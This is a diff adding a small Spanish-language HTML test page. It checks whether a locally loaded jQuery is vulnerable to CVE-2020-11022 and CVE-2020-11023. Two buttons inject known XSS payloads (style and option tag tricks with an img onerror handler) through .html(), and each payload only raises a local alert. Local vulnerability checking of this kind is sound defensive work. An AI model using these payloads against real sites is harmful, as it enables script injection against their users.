@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Prueba local jQuery CVE</title>
+<script src="jquery.js"></script>
+</head>
+<body>
+<h2>Prueba local de jQuery</h2>
+
+<p id="version"></p>
+
+<button onclick="probar11022()">Probar CVE-2020-11022</button>
+<button onclick="probar11023()">Probar CVE-2020-11023</button>
+
+<div id="resultado"></div>
+
+<script>
+$("#version").text("jQuery detectado: " + $.fn.jquery);
+
+function probar11022() {
+    $("#resultado").empty();
+
+    var html =
+      '<style/><img src="archivo-inexistente-11022" ' +
+      'onerror="alert(\'Prueba local 11022\')">';
+
+    $("#resultado").html(html);
+}
+
+function probar11023() {
+    $("#resultado").empty();
+
+    var html =
+      '<option><style></option>' +
+      '<img src="archivo-inexistente-11023" ' +
+      'onerror="alert(\'Prueba local 11023\')">';
+
+    $("#resultado").html(html);
+}
+</script>
+</body>
+</html>
